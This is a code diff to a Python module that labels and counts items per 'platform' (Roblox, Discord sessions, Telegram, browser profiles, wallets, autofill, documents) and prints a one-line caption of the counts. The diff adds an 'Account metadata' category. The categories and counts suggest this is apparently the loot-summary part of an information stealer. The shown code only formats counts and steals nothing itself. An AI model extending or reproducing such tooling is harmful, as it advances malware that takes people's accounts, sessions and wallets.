@@ -19,6 +19,7 @@ from typing import Final
 PLATFORMS: Final[dict[str, str]] = {
     "roblox": "Roblox",
     "discord": "Discord",
+    "account": "Account metadata",
     "telegram": "Telegram",
     "browser": "Browser profiles",
     "wallet": "Wallets",
@@ -37,6 +38,7 @@ MODULE_PLATFORM: Final[dict[str, str]] = {
     "browsers": "browser",
     "roblox": "roblox",
     "sessions": "discord",
+    "identity": "account",
     "wallets": "wallet",
     "autofill": "autofill",
     "documents": "documents",
@@ -50,6 +52,7 @@ _ORDER: Final[tuple[str, ...]] = (
     "host",
     "roblox",
     "discord",
+    "account",
     "telegram",
     "wallet",
     "autofill",
@@ -92,9 +95,9 @@ def table(counts: dict[str, int]) -> list[dict[str, object]]:
 
 
 def line(counts: dict[str, int]) -> str:
-    """One caption line: ``host 12 · Discord 3 · Browser profiles 682``."""
+    """One caption line: ``host 12 | Discord 3 | Browser profiles 682``."""
     rows = [row for row in table(counts) if int(row["items"]) > 0]
-    return " · ".join(f"{row['label']} {int(row['items']):,}" for row in rows)
+    return " | ".join(f"{row['label']} {int(row['items']):,}" for row in rows)
 
 
 __all__ = ["MODULE_PLATFORM", "PLATFORMS", "label", "line", "platform", "table"]
